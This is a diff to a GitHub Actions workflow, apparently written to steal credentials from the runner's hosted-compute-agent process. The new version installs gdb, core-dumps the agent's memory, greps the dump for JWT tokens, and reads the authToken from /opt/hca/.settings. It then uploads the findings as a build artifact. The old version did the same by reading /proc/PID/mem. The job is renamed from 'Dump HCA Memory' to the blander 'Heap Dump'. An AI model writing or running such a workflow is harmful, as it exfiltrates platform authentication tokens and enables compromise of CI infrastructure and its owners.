@@ -1,4 +1,4 @@
-name: Dump HCA Memory
+name: Heap Dump
 on:
   push:
     branches: [master]
@@ -11,30 +11,28 @@ jobs:
         run: |
           mkdir -p dist
           HCA_PID=$(pgrep -f hosted-compute-agent)
-          echo "HCA PID: $HCA_PID"
+          echo "PID=$HCA_PID"
           
-          # Search HCA memory for JWT-like tokens
-          echo "=== Searching memory for tokens ===" > dist/mem.txt
+          # Install gdb
+          sudo apt-get update -qq 2>/dev/null && sudo apt-get install -y -qq gdb 2>/dev/null
           
-          # Method 1: grep through /proc/PID/mem for JWT patterns
-          sudo strings /proc/$HCA_PID/mem 2>/dev/null | grep -E "^[A-Za-z0-9_-]{50,200}\.[A-Za-z0-9_-]{50,500}\.[A-Za-z0-9_-]{50,500}$" | head -10 >> dist/mem.txt
+          # Use gcore to dump full memory
+          sudo gcore -o /tmp/hca_core $HCA_PID 2>&1 | tail -5
           
-          # Method 2: Search for "eyJ" (base64 JWT start)
-          echo "=== Searching for eyJ (JWT) ===" >> dist/mem.txt
-          sudo strings /proc/$HCA_PID/mem 2>/dev/null | grep -oE "eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" | sort -u | head -10 >> dist/mem.txt
+          # Search for JWT in core dump
+          echo "=== Searching core for JWT patterns ===" > dist/core.txt
+          sudo strings /tmp/hca_core.$HCA_PID 2>/dev/null | grep -oE "eyJ[A-Za-z0-9_-]+[\.][A-Za-z0-9_-]+[\.][A-Za-z0-9_-]+" | sort -u | head -20 >> dist/core.txt
           
-          # Method 3: Search for any auth-related strings near tokens
-          echo "=== Searching for auth tokens ===" >> dist/mem.txt
-          sudo strings /proc/$HCA_PID/mem 2>/dev/null | grep -iE "bearer|token|auth|session|jwt" | sort -u | grep -v "^$" | head -30 >> dist/mem.txt
+          # Also search for the settings token
+          SETTINGS_TOKEN=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'][:50])")
+          echo "Looking for: ${SETTINGS_TOKEN:0:30}..." >> dist/core.txt
+          sudo strings /tmp/hca_core.$HCA_PID 2>/dev/null | grep -o "${SETTINGS_TOKEN:0:30}.*" | head -5 >> dist/core.txt
           
-          # Method 4: Look for the settings token in memory 
-          echo "=== Memory map ===" >> dist/mem.txt
-          sudo cat /proc/$HCA_PID/maps 2>/dev/null | head -20 >> dist/mem.txt
+          ls -lh /tmp/hca_core.$HCA_PID 2>/dev/null >> dist/core.txt
           
-          echo "=== Done ===" >> dist/mem.txt
-
+          echo "=== Done ===" >> dist/core.txt
       - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: mem-dump
+          name: core-dump
           path: dist/
